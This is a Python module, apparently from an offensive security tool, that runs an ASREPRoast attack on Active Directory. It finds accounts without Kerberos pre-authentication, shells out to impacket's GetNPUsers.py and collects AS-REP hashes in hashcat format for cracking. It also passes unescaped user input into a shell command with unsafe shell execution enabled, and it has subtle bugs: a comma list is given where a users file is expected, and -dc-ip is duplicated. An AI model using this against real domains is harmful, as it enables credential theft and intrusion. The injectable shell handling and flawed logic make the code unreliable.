"""
ASREPRoast Attack Module

Executes ASREPRoast attack for obtaining user hashes with disabled Kerberos pre-authentication
"""

import time
from typing import Dict, Any
from ....proto import DirectoryType, ScanOptions
from ...enumeration.user_enumerator import UserEnumerator
from utils.async_subprocess import run_shell


class ASREPRoastAttack:
    """Executes ASREPRoast attack"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
        self.user_enumerator = UserEnumerator(plugin_instance)
    
    async def execute(self, scan_options: ScanOptions, directory_type: DirectoryType) -> Dict[str, Any]:
        """
        Executes ASREPRoast attack for obtaining user hashes
        with disabled Kerberos pre-authentication.
        
        Args:
            scan_options: Parameters for execution attack
            directory_type: Directory type
            
        Returns:
            Dict[str, Any]: Attack results, including AS-REP hashes
        """
        result = {
            "success": False,
            "hashes": [],
            "errors": [],
            "statistics": {
                "total_candidates_found": 0,
                "total_hashes_obtained": 0,
                "execution_time": 0
            }
        }
        
        start_time = time.time()
        
        if not scan_options.domain_name:
            result["errors"].append("Domain name not specified")
            return result
        
        try:
            if directory_type == DirectoryType.ACTIVE_DIRECTORY:
                asreproast_candidates = []
                
                if scan_options.username and (scan_options.password or scan_options.ntlm_hash):
                    users = await self.user_enumerator.enumerate(scan_options, directory_type)
                    
                    for user in users:
                        if user.asreproast_candidate:
                            asreproast_candidates.append(user)
                
                result["statistics"]["total_candidates_found"] = len(asreproast_candidates)
                
                try:
                    cmd_parts = []
                    cmd_parts.append("GetNPUsers.py")
                    
                    if asreproast_candidates and scan_options.username and (scan_options.password or scan_options.ntlm_hash):
                        cmd_parts.append(f"{scan_options.domain_name}/ -usersfile {','.join([user.sam_account_name for user in asreproast_candidates])}")
                    else:
                        cmd_parts.append(f"{scan_options.domain_name}/")
                    
                    if scan_options.username and scan_options.password:
                        cmd_parts.append(f"-dc-ip {scan_options.ldap_server or ''}")
                    
                    if scan_options.ldap_server:
                        cmd_parts.append(f"-dc-ip {scan_options.ldap_server}")
                    
                    cmd_parts.append("-request -format hashcat")
                    
                    cmd = " ".join(cmd_parts)
                    
                    rc, out, err = await run_shell(cmd, timeout=120, allow_unsafe_shell=True)
                    
                    if rc == 0:
                        hash_lines = []
                        for line in (out or "").strip().split("\n"):
                            if "$krb5asrep$" in line:
                                parts = line.split(":")
                                if len(parts) >= 2:
                                    username = parts[0].strip()
                                    hash_value = parts[1].strip()
                                    
                                    hash_lines.append({
                                        "username": username,
                                        "hash": hash_value,
                                        "hash_type": "Kerberos 5 AS-REP etype 23"
                                    })
                        
                        result["hashes"] = hash_lines
                        result["statistics"]["total_hashes_obtained"] = len(hash_lines)
                        result["success"] = True
                        
                        if not hash_lines:
                            result["errors"].append("Hashes not found AS-REP")
                    else:
                        result["errors"].append(f"Error during execution ASREPRoast: {err}")
                except Exception as e:
                    result["errors"].append(f"Error during execution ASREPRoast: {str(e)}")
            
            elif directory_type == DirectoryType.FREEIPA:
                result["errors"].append("AS-REP attack on FreeIPA requires other methods and will be implemented later")
            
            else:
                result["errors"].append("Unsupported directory type")
        
        except Exception as e:
            result["errors"].append(f"General error: {str(e)}")
        
        result["statistics"]["execution_time"] = time.time() - start_time
        
        return result

